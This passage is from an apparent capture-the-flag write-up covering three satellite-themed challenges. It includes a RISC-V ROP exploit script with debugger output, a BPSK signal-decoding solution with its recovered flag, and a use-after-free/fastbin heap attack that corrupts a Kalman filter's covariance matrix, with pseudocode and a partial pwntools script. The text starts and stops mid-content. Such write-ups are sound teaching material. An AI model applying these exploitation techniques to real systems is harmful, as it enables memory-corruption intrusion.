\u0026lt;_IO_puts+156\u0026gt;: lw s1,20(sp) 0x167da \u0026lt;_IO_puts+158\u0026gt;: lw s2,16(sp) 0x167dc \u0026lt;_IO_puts+160\u0026gt;: lw s3,12(sp) 0x167de \u0026lt;_IO_puts+162\u0026gt;: lw s4,8(sp) 0x167e0 \u0026lt;_IO_puts+164\u0026gt;: add sp,sp,32 0x167e2 \u0026lt;_IO_puts+166\u0026gt;: ret Here you can see that this gadget sets ra to an value on the stack which we control, and a0 to s0. If we check the value of s0 we can see that \u0026hellip;\n‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ code:riscv:RISCV ‚îÄ‚îÄ‚îÄ‚îÄ 0x10f9e \u0026lt;do_b2+74\u0026gt; j 0x10fa2 \u0026lt;do_b2+78\u0026gt; 0x10fa0 \u0026lt;do_b2+76\u0026gt; li a5, 0 0x10fa2 \u0026lt;do_b2+78\u0026gt; mv a0, a5 ‚Üí 0x10faa \u0026lt;do_b2+86\u0026gt; ret [!] Cannot disassemble from $PC ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ stack ‚îÄ‚îÄ‚îÄ‚îÄ 0x40800d90‚îÇ+0x0000: 0x62616166 ‚Üí 0x62616166 ‚Üê $sp 0x40800d94‚îÇ+0x0004: 0x62616167 ‚Üí 0x62616167 0x40800d98‚îÇ+0x0008: 0x62616168 ‚Üí 0x62616168 0x40800d9c‚îÇ+0x000c: 0x62616169 ‚Üí 0x62616169 0x40800da0‚îÇ+0x0010: 0x6261616a ‚Üí 0x6261616a 0x40800da4‚îÇ+0x0014: 0x6261616b ‚Üí 0x6261616b 0x40800da8‚îÇ+0x0018: 0x6261616c ‚Üí 0x6261616c 0x40800dac‚îÇ+0x001c: 0x6261616d ‚Üí 0x6261616d ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ threads ‚îÄ‚îÄ‚îÄ‚îÄ [#0] Id 1, stopped 0x10faa in do_b2 (), reason: BREAKPOINT ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ trace ‚îÄ‚îÄ‚îÄ‚îÄ [#0] 0x10faa ‚Üí do_b2(size=0x12c) ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ gef‚û§ p $s0 $1 = (void *) 0x62616164 gef‚û§ \u0026hellip; We control it! Now we can directly jump to this gadget and set the value of r0 to the address of puts() and a0 to the value of flag by modifying the appropriate stack values\nNOTE: On the remote server, the stack is a little bit different due to the presence of environment variables. Therefore, the actual address of the flag changes by some offset. We can brute force the offset since we know that it is not large.\nExploit script # #!/usr/bin/env python3 # # Usage: ./solve.py REMOTE # from pwn import * import zlib import os exe = ELF(\u0026#34;./drop-baby\u0026#34;) context.arch = \u0026#34;riscv\u0026#34; context.bits = 32 # context.binary = exe gdbscript = \u0026#34;\u0026#34;\u0026#34; file drop-baby target remote localhost:1234 \u0026#34;\u0026#34;\u0026#34; def start(): if args.REMOTE: io = remote(\u0026#34;drop.quals2023-kah5Aiv9.satellitesabove.me\u0026#34;, 5300) io.sendline( \u0026#34;ticket{REDACTED}\u0026#34; ) else: if args.GDB: os.system(\u0026#34;tmux splitw -h gdb-multiarch -ex init-gef -x .gdbrun\u0026#34;) io = process( [\u0026#34;qemu-riscv32\u0026#34;, \u0026#34;-g\u0026#34;, \u0026#34;1234\u0026#34;, \u0026#34;drop-baby\u0026#34;], env={\u0026#34;FLAG\u0026#34;: \u0026#34;flag{REDACTED}\u0026#34;, \u0026#34;TIMEOUT\u0026#34;: \u0026#34;999999999\u0026#34;}, ) return io APPLICATION_NAME = \u0026#34;Baby dROP\u0026#34; A1_MSG_LEN = 40 A2_MSG_LEN = 10 B1_MSG_LEN = 20 B2_MSG_LEN = 300 CC_MSG_LEN = 25 ZY_MSG_LEN = 0 SILENT_ERRORS = True for i in range(0, 0x1000, 6): with start() as io: # synchronize io.send(b\u0026#34;\\xde\\xad\\xbe\\xef\u0026#34;) # b2 msg io.send(b\u0026#34;\\xb2\u0026#34;) payload = fit( { # stack address of the flag 112: [0x40800FE0 - i], # stack address of magic gadget 116: [0x167D2], # puts address 148: [0x1673C], } ) payload = payload.ljust(B2_MSG_LEN - 4, b\u0026#34;X\u0026#34;) payload += p32(zlib.crc32(payload)) io.send(payload) recvd = io.recvall(timeout=2) if b\u0026#34;flag{\u0026#34; in recvd: log.success(recvd.decode()) exit(0) FAUXY Lady # The challenge # Category: \u0026ldquo;Can\u0026rsquo;t Stop the Signal, Mal\u0026rdquo;\nA university needs your help collecting their cubesat\u0026rsquo;s telemetry. We\u0026rsquo;ve captured a .wav recording of the satellite signal and the university has published the telemetry definition. The recorded signal has the following characteristics:\nBPSK modulated Differentially encoded 44.1k samples per second Can you reconstruct the telemetry packet?\nDescription # The challenge presents to us with a waveform file signal.wav and a description that says that the signal is BPSK modulated with a sample rate of 44.1Khz and differentially encoded. We were also given the packet specification of this protocol in a pdf file.\nSolution # Our approach started with the analisys of the signal inside GNURadio Companion, we set the sample rate to 44.1Khz, imported the file with a Wav file source block and converted it into complex type using a Float to Complex block. We then used a BPSK Demodulator block guessing the baudrate while also watching the output with a Time Sink block. As soon as we set baudrate to 1200 and Differential to True we got a nice square wave out. We then exported the bitstream and further processed it Python.\nData processing # The challenge description mentioned differential encoding, so the first step we applied was a differential decoder:\nfor b in bits: out.append(b ^ prev) prev = b Printing out the resulting bits, we noticed that after the first section where there was some noise, splitting the text in 8 bit chunks only ever produced two bitstrings:\n00000000 10000001 We guessed that each of these represented a single bit in the message, and we also knew from the challenge description that the packets we were looking for started with a magic number of 0x1ACFFC1D. We looked for a bit mapping that contained the magic, and decoded the bitstream, mapping 00000000 to 1 and 10000001 to 0.\nFinally, we extracted the three packets contained in the bitstream and printed their contents, revealing the three parts of the flag.\nSolution scripts # Bit mapping # # out.out comes from gnuradio with open(\u0026#39;out.out\u0026#39;, \u0026#39;rb\u0026#39;) as fin: data = fin.read() bits = [] for ch in data: for b in bin(ch)[2:].rjust(8, \u0026#39;0\u0026#39;): bits.append(int(b)) out = [] prev = 0 for b in bits: out.append(b ^ prev) prev = b out = \u0026#39;\u0026#39;.join(map(str, out)) msg = \u0026#39;\u0026#39; for i in range(0, len(out), 8): if out[i:i+8] == \u0026#39;00000000\u0026#39;: msg += \u0026#39;1\u0026#39; else: msg += \u0026#39;0\u0026#39; print(msg) Final decoding # data = [ \u0026#39;000110101100111111111100000111010000000001100100000000000110010001111110001100010100000101000010001011010100001101000100010001010011001001000110010001110100100001001001001011010011000100000011111100000110011001101100011000010110011101111011011101110110100001101001011100110110101101100101011110010011100100110001001101000011011000110001001110000110110101101001011010110110010100110100001110100100011101001101011110100101011000110101001110000111100101000101011011010100110101110001010011110110011101010000010110100101010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000011010011000000101111110111111111\u0026#39;, \u0026#39;000110101100111111111100000111010000000001100100000000000110010001111110001100010100000101000010001011010100001101000100010001010011001001000110010001110100100001001001001011010011000100000011111100000111011101010010011010100111010101001101011011100110110100110010010100000110100000101101010001110110101100110110010000010100111001000001011011010101100001001010010100010110101001000001001100000100010101101000011011010011000101000101010010000111000001001001001110010100110101001000001100110101010001000111011110100011010100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100011101010101101111110111111111\u0026#39;, \u0026#39;000110101100111111111100000111010000000001100100000000000110010001111110001100010100000101000010001011010100001101000100010001010011001001000110010001110100100001001001001011010011000100000011111100000100001100110100010010010100001101011000011110000110101101110101001110000100010101001010011010000110101000111001011101010100110001010000010110010011010001101100010000110111000001000100010100000111011101110011011011010100001101101000011100110101100101111101000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000101111011001111101111110111111111\u0026#39;, ] for packet in data: text = [] for i in range(0, len(packet), 8): v = int(packet[i:i+8], 2) text.append(v) print(bytes(text)) # flag{whiskey914618mike4:GMzV58yEmMqOgPZTwRjuMnm2Ph-Gk6ANAmXJQjA0Ehm1EHpI9MH3TGz5C4ICXxku8EJhj9uLPY4lCpDPwsmChsY} Kalman At Me Bro # The challenge # Category: \u0026ldquo;Pure Pwnage\u0026rdquo;\nSumamry: Use fastbin attack to modify the covariance matrix of the Kalman Filter employed in the implemented simulation.\nDescription # In this challenge, an Kalman Filter is implemented to estimate the relative position of a satellite with respect to a space station. The estimate is derived from a given set of movements and the position readings coming from a sensor. The objective is to achieve a final estimated relative position that is within 10 meters of the space station along x,y,z axes, with a valid state for the Kalman filter and high confidence on the estimate (small covariance matrix).\nSolution # Used types # struct PositionMeasurement { uint64_t time; uint64_t x; uint64_t y; uint64_t z; }; struct PositionUpdate { void *vtable; _BYTE pad[40]; _BYTE matrix[144]; double *variance_arr; _BYTE pad2[8]; }; struct Link { PositionMeasurement pos; struct Link *prev; struct Link *next; }; struct LinkedList { Link *head; Link *tail; }; struct User { PositionUpdate pos_update; LinkedList linked_list; _BYTE measurements_vec[40]; }; Functionalities implemented in the binary # When the binary is started we are greeted with the following menu:\n1: Add measurement 2: Remove first measurement 3: Remove last measurement 4: List measurements 5: Run simulation Choice\u0026gt; Internally a struct User is created, this will be used throughout the program:\nint main(int argc, const char **argv) { ... User::User(\u0026amp;user) ... } void User::User(User *this) { PositionUpdate::PositionUpdate(\u0026amp;this-\u0026gt;pos_update); LinkedList\u0026lt;PositionMeasurement\u0026gt;::LinkedList(\u0026amp;this-\u0026gt;linked_list); std::vector\u0026lt;AccelerationMeasurement,std::allocator\u0026lt;AccelerationMeasurement\u0026gt;\u0026gt;::vector(this-\u0026gt;measurements_vec); User::loadAccels(this); User::loadPositions(this); PositionUpdate::setVariance(\u0026amp;this-\u0026gt;pos_update, 100.0, 100.0, 100.0, 10.0, 10.0, 10.0); } 1: Add measurement # When we add a measurement we are asked for X,Y,Z and the time:\n1: Add measurement 2: Remove first measurement 3: Remove last measurement 4: List measurements 5: Run simulation Choice\u0026gt; 1 Enter new measurement. X,Y,Z are uint64 fixed point numbers. Time is usec counts. Time (US)\u0026gt; 10 X\u0026gt; 20 Y\u0026gt; 30 Z\u0026gt; 40 From these values a PositionMeasurement struct is created and then added to the linked list linked_list of the user struct.\nunsigned __int64 User::addMeasurement(User *this) { ... LinkedList\u0026lt;PositionMeasurement\u0026gt;::addBack(\u0026amp;this-\u0026gt;linked_list, \u0026amp;measurement); ... } 2: Remove first measurement # Option 2 allows us to remove the first element from the head of the linked list (linked_list):\nvoid LinkedList\u0026lt;PositionMeasurement\u0026gt;::popFront(LinkedList *list) { Link *head; head = list-\u0026gt;head; if (list-\u0026gt;head) { list-\u0026gt;head = list-\u0026gt;head-\u0026gt;next; if (list-\u0026gt;head) list-\u0026gt;head-\u0026gt;prev = NULL; if (head) operator delete(head); } } 3: Remove last measurement # Option 3 allows us to remove the first element from the tail of the linked list (linked_list):\nvoid LinkedList\u0026lt;PositionMeasurement\u0026gt;::popBack(LinkedList *list) { Link *cur; cur = list-\u0026gt;tail; if (cur) { list-\u0026gt;tail = list-\u0026gt;tail-\u0026gt;prev; if (list-\u0026gt;tail) list-\u0026gt;tail-\u0026gt;next = NULL; cur-\u0026gt;next = NULL; cur-\u0026gt;prev = NULL; if (cur) operator delete(cur); } } 4: List measurements # Option 4 allows us to list all the measurements and print their values (time, x, y, z).\nvoid User::listMeasurement(User *this) { bool is_not_null; unsigned __int64 i; Link *pos_measurement; is_not_null = 1; i = 0; puts(\u0026#34; Time (us), X, Y, Z\u0026#34;); while (is_not_null) { pos_measurement = LinkedList\u0026lt;PositionMeasurement\u0026gt;::getIndex(\u0026amp;this-\u0026gt;linked_list, i); if ( pos_measurement ) User::printMeasurment(this, i, \u0026amp;pos_measurement-\u0026gt;pos); ++i; is_not_null = (pos_measurement != NULL); } } Kalman Filters Explained # Kalman filters are used to estimate the position of an object, combining the effect of measurements by sensors and the commands that are given to actuators. In this case, the filter receives information from two sources: acceleration readings and position readings. The accelerations are constant between executions and we have no control over them. On the other hand, we can influence the state of the kalman filter as we have control on the position readings.\nBoth positions and accelerations are three-dimensional with an associated timestamp. The simulation loop steps forward in time from one acceleration reading to the next, terminating after they are finished. Before applying the effect of the acceleration, the program checks if the next position in the list of readings has a timestamp lower than the acceleration that is about to be processed, in that case, the state of the filter is updated with the information provided by the positional reading, then propagated to the timestamp of the acceleration. At that point, the acceleration is applied to the filter and the simulation continues.\nAs we have control on the positional readings, we can feed fake measurements to the filter to bring the estimate close to the station, however, the accuracy of the sensor is too low to allow us to steer the estimate to the position we need with sufficient accuracy (the magnitude of the covariance matrix describing the sensor is too high)\nVulnerability # The struct LinkedList linked_list holds a pointer to the head and the tail of the linked list. When using option 2 and 3 the elements of the linked lists are freed and removed starting from the head or the tail. When the list only contains one element, head and tail both point to the same Link struct. When removing the head or the tail from such linked list the other pointer is not updated and this will later cause a uaf/double free.\nExample:\nhead = A tail = A If now we pop from the front:\nhead = NULL tail = A tail now points to a freed Link struct. (a pop back now would cause a double free).\nSimilarly if we pop from the back:\nhead = A tail = NULL head now points to a freed Link struct (a pop front now would cause a double free).\nWhen printing the linked list the list is walked starting from the head pointer, so to get an info leak we want this case:\nhead = A tail = NULL Using these primitives we used a fastbin attack to obtain an arbitrary write on the heap\nFastbin attack pseudocode # # The list initially has 11 elements # remove them all starting from the tail of the linked list for _ in range(11): remove_last_measurement() # At this point the head pointer is freed, we can get an heap leak heap_leak = list_measurements()[0][0] # This add will overewrite the UAFd head, # fixing the list add_measurement(0x1337, 0, 0, 0) # List : A \u0026lt;-\u0026gt; A, and 6 elements in 0x40 tcache # Drain tcache for i in range(8): add_measurement(u64(p8(0x41+i)*8), 0, 0, 0) # Fill tcache for _ in range(8): remove_last_measurement() # List: A \u0026lt;-\u0026gt; A, and 0x40 tcache is full remove_first_measurement() # List: NULL \u0026lt;-\u0026gt; A (free) for i in range(7): add_measurement(u64(p8(0x41+i)*8), 0, 0, 0) # now 0x40 tcache is empty add_measurement(u64(p8(0x41+i)*8), 0, 0, 0) # List: NULL \u0026lt;-\u0026gt; A \u0026lt;-\u0026gt; ... (7) ... \u0026lt;-\u0026gt; A for i in range(7): add_measurement(u64(p8(0x41+i)*8), 0, 0, 0) # List: NULL \u0026lt;-\u0026gt; A \u0026lt;-\u0026gt; ... (7) ... \u0026lt;-\u0026gt; A \u0026lt;-\u0026gt; ... (7) for i in range(7): remove_last_measurement() # List: NULL \u0026lt;-\u0026gt; A \u0026lt;-\u0026gt; ... (7) ... \u0026lt;-\u0026gt; A, and tcache 0x40 is full remove_last_measurement() # NULL \u0026lt;-\u0026gt; A (free) \u0026lt;-\u0026gt; ... (7) ... for i in range(7): remove_last_measurement() # NULL \u0026lt;-\u0026gt; A (free) remove_last_measurement() # double free fastbin A # NULL \u0026lt;-\u0026gt; NULL for i in range(7): add_measurement(u64(p8(0x41+i)*8), 0, 0, 0) # drain tcache 0x40 # Allocate A, overwrite its next pointer target = 0x4141414141414141 add_measurement(target, 0, 0, 0) # consume tcache so we can consume fastbins for i in range(7): add_measurement(u64(p8(i+1)*8), u64(b\u0026#34;X\u0026#34;*8), 0, u64(b\u0026#34;Z\u0026#34;*8)) # Consume 1 pad chunk from fastbin add_measurement(0, 0, 0, 0) # pad # next 0x40 fastbin alloc will end up at 0x4141414141414141 # pwndbg\u0026gt; bins # ... # fastbins # 0x20: 0x0 # 0x30: 0x0 # 0x40: 0x4141414141414141 (\u0026#39;AAAAAAAA\u0026#39;) # 0x50: 0x0 # 0x60: 0x0 # 0x70: 0x0 # 0x80: 0x0 # ... Pwning the Kalman Filter # Now that we have control over the forward pointer of the 0x40 fastbin, the next step is to determine which pointer to place there. As explained earlier, we have control over the positional readings, but the sensor is not accurate enough, so we can use the vulnerability to alter the accuracy characteristic of the sensor to give more weights to our measures.\nDuring the challenge startup, the User::User() constructor initializes the variance_arr array of doubles for the PositionUpdate object associated with the user. This array is the covariance matrix of the position sensor.\nThis matrix is initialized to\n\\begin{matrix} 100 \u0026amp; 10 \u0026amp; 10 \\ 10 \u0026amp; 100 \u0026amp; 10 \\ 10 \u0026amp; 10 \u0026amp; 100 \\end{matrix}\nby the PositionUpdate::setVariance method, called inside User::User().\nAfter inserting a breakpoint into PositionUpdate::setVariance, we observe that the covariance matrix is stored in the heap and initialized before the simulation and it\u0026rsquo;s never modified after that. With the base address of the heap already leaked, we can calculate the memory address of the covariance matrix and place it in the 0x40 fastbin.\nAfter initializing the covariance matrix, it is possible to inspect the memory using gdb to obtain the layout of the chunk where it is stored.\nheap_base + 0x11e90: 0x0000000000000000 0x0000000000000000 heap_base + 0x11ea0: 0x0000000000000000 0x0000000000000041 heap_base + 0x11eb0: 0x4059000000000000 0x4059000000000000 heap_base + 0x11ec0: 0x4059000000000000 0x4024000000000000 heap_base + 0x11ed0: 0x4024000000000000 0x4024000000000000 heap_base + 0x11ee0: 0x0000000000000000 0x00000000000001e1 This chunk contains the double precision floating point representation of 100 (0x4059000000000000) and 10 (0x4024000000000000).\nUsing the fastbin attack that was previously employed, it is possible to modify the values in the covariance matrix. This allows to give measures with the accuracy that we choose, enabling us to heavily affect the simulation. To carry out the fastbin attack successfully, we need to place the address of something that resembles a 0x40 sized chunk in the 0x40 fastbin. Since the chunk storing the covariance matrix has a size of 0x40, it can be placed in the 0x40 fastbin. Specifically, we insert the address heap_base + 0x11e90 into the 0x40 fastbin.\nBeing the covariance matrix:\n\\begin{matrix} a_{0,0} \u0026amp; a_{0,1} \u0026amp; a_{0,2} \\ a_{1,0} \u0026amp; a_{1,1} \u0026amp; a_{1,2} \\ a_{2,0} \u0026amp; a_{2,1} \u0026amp; a_{2,2} \\end{matrix}\nby allocating two additional position measurements, it is possible to place arbitrary values in $a_{0,0}$ and $a_{a_{1,1}}$, while storing the forward and backward pointers of the 0x40 fastbin in $a_{0,1}$, $a_{1,0}$, and $a_{2,2}$. When interpreted using floating point representation, these values are close to zero.\nWe put in $a_{0,0}, a_{0,1}$ the value 0, with a resulting covariance matrix of\n$\\begin{matrix} 0 \u0026amp; 4.65326\\mathrm{e}{-310} \u0026amp; 10 \\ 4.65326\\mathrm{e}{-310} \u0026amp; 0 \u0026amp; 10 \\ 10 \u0026amp; 10 \u0026amp; 4.65326\\mathrm{e}{-310} \\end{matrix}$\nThe zeros along the diagonal for the x and y coordinates and the extremely small value for the z coordinate, make the sensor behave almost as ground truth, moving the estimate for the position almost exactly to where we put the reading.\nPoisoning measurements to make the satellite closer to the space station # In the final step of the exploitation, the position values stored in memory are modified to bring the satellite closer to the space station.\nThe User::run(User *this) function is responsible for running the simulation. By examining the function, it becomes clear that the simulation processes each acceleration measurement provided in the accels.bin file. The file contains a set of accelerations from timestamp 0 to timestamp 100.9 seconds, with each acceleration separated by an interval of 0.1 seconds.\nThe simulation algorithm only processes a position measurement if it precedes the currently processed acceleration. Otherwise, the algorithm only propagates using the state and accelerations.\nHowever, it is important to note that the simulation algorithm considers the positions stored in the LinkedList of measurements in ascending order of timestamp.\n// Get the head element of LinkedList Front = LinkedList\u0026lt;PositionMeasurement\u0026gt;::getFront(\u0026amp;this-\u0026gt;positions_linked_list, 0LL); // ... // Simulation code // ... if (CurrentAcceleration.Time \u0026lt;= Front.Time) { // ... // Propagate the current result // ... } else { // ... // Use the position to update the simulation state // ... LinkedList\u0026lt;PositionMeasurement\u0026gt;::popFront(\u0026amp;this-\u0026gt;positions_linked_list); if ( LinkedList\u0026lt;PositionMeasurement\u0026gt;::getFront(\u0026amp;this-\u0026gt;positions_linked_list, 0LL) ) Front = LinkedList\u0026lt;PositionMeasurement\u0026gt;::getFront(\u0026amp;this-\u0026gt;positions_linked_list, 0LL); } The pseudocode indicates that the LinkedList of positions is only iterated when the current acceleration has a lower timestamp than the current position. By adding a series of positional readings with a timestamp close to the end of the simulation at the head of the LinkedList, the simulation will proceed using only the acceleration up to that point. Then, thanks to the extremely small covariance matrix, the positional readings can deceive the Kalman filter placing the estimate to where we need it, with high reported accuracy.\nThankfully, we have control over the head of the LinkedList while draining the tcache 0x40. We simply need to drain the tcache by inserting measurements with a timestamp close to the final acceleration, which occurs at 100000999 microseconds. The resulting measurement list will appear like this:\nRaw Measurement 0: 100000999 0 0 0 Raw Measurement 1: 100000999 0 0 0 Raw Measurement 2: 100000999 0 0 0 Raw Measurement 3: 100000999 0 0 0 Raw Measurement 4: 100000999 0 0 0 Raw Measurement 5: 100000999 0 0 0 Raw Measurement 6: 100000999 0 0 0 Raw Measurement 7: 3735928559 3648368.206055 3468143.733398 3468144.206055 Raw Measurement 8: 0 0.063477 0.000000 0.000000 Raw Measurement 9: 0 0.063477 0.000000 0.000000 Running the simulation with these position values, we obtain a final covariance matrix of \\begin{matrix} 2.40386 \u0026amp;\u0026amp; 0.0149185 \u0026amp;\u0026amp; 1.46353 \\ 0.0149185 \u0026amp;\u0026amp; 2.40386 \u0026amp;\u0026amp; 1.46353 \\ 1.46353 \u0026amp;\u0026amp; 1.46353 \u0026amp;\u0026amp; 2.41878 \\end{matrix}\nand a final estimated position of $-38.138080,-27.710931,-1.540729$.\nTo ensure that the final position satisfies the 10-meter constraint from the space station, it is necessary to drain the tcache with the following position measurement: $100000999, 33.203125, 21.484375, 2.929688$.\nThis did the trick, giving us a final position estimate of $-4.933969,-6.225570,1.020739$ and the same final covariance matrix, at the end of the simulation.\nSo, we got the flag!\nExploit script # #!/usr/bin/env python3 from pwn import * #import ipdb # exe = ELF(\u0026#34;./Kalman_patched\u0026#34;) # libc = ELF(\u0026#34;./libc-2.31.so\u0026#34;) # context.binary = exe # context.log_level = \u0026#39;warning\u0026#39; def conn(): if args.GDB: r = remote(\u0026#39;localhost\u0026#39;, 2007) input(\u0026#39;wait for gdb to attach\u0026#39;) elif args.REMOTE: r = remote(\u0026#34;kalman.quals2023-kah5Aiv9.satellitesabove.me\u0026#34;, 5300) r.sendlineafter(b\u0026#34;please:\\n\u0026#34;, b\u0026#34;ticket{yankee725474mike4:GPYXYVILP60gKGJ1cc_gpGhXmFSaJh9uwelxoeiMoPAPH84JrU4Sp4EsjVnd_U9xVg}\u0026#34;) return r def add_measurement(time, x, y, z): r.sendline(b\u0026#34;1\u0026#34;) r.recvuntil(b\u0026#34;Time (US)\u0026gt;\\n\u0026#34;) r.sendline(b\u0026#34;%ld\u0026#34; % time) r.recvuntil(b\u0026#34;X\u0026gt;\\n\u0026#34;) r.sendline(b\u0026#34;%ld\u0026#34; % x) r.recvuntil(b\u0026#34;Y\u0026gt;\\n\u0026#34;) r.sendline(b\u0026#34;%ld\u0026#34; % y) r.recvuntil(b\u0026#34;Z\u0026gt;\\n\u0026#34;) r.sendline(b\u0026#34;%ld\u0026#34; % z) r.recvuntil(b\u0026#34;Choice\u0026gt;\\n\u0026#34;) def add_measurement_raw(time, x, y, z): r.sendline(b\u0026#34;1\u0026#34;) r.recvuntil(b\u0026#34;Time (US)\u0026gt;\\n\u0026#34;) r.sendline(time) r.recvuntil(b\u0026#34;X\u0026gt;\\n\u0026#34;) r.sendline(x) r.recvuntil(b\u0026#34;Y\u0026gt;\\n\u0026#34;) r.sendline(y) r.recvuntil(b\u0026#34;Z\u0026gt;\\n\u0026#34;) r.sendline(z) r.recvuntil(b\u0026#34;Choice\u0026gt;\\n\u0026#34;) def remove_first_measurement(): r.sendline(b\u0026#34;2\u0026#34;) 